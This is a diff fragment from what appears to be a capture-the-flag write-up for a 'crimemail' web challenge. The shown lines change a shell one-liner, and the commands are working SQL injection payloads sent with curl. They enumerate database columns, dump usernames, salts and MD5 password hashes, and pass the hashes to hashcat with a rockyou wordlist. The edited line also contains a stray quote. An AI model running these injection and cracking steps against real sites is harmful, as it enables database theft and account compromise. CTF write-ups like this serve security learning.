@@ -21,5 +21,5 @@ tcpflow -C -r ids_alert.pcap | sed -n "3p" | cut -d":" -f2 > key; tcpflow -C -r 
 curl  --data-urlencode "username=username=data' union select group_concat(concat(table_name,0x20,column_name)) from information_schema.columns where table_schema=database()-- " -X POST https://crimemail.ctf.insecurity-insa.fr/hint.php
 ```
 ```bash
-curl -s --data-urlencode "username=username=data' union select group_concat(concat(username,0x20,pass_salt,0x20,pass_md5)) from users-- " -X POST https://crimemail.ctf.insecurity-insa.fr/hint.php | grep -Eo "c\.hackle.*d" > hash; ./hashcat -a 0 -m 10 `cut -d" " -f3,2 hash | awk '{ print $2 ":" $1}'` rockyou.txt
+curl -s --data-urlencode "username=username=data' union select group_concat(concat(username,0x20,pass_salt,0x20,pass_md5)) from users-- " -X POST https://crimemail.ctf.insecurity-insa.fr/hint.php | grep -Eo "c\.hackle.*d" > hash; ./hashcat -a 0 -m 10 `awk '{print $3 ":" $2}' hash'` rockyou.txt
 ```
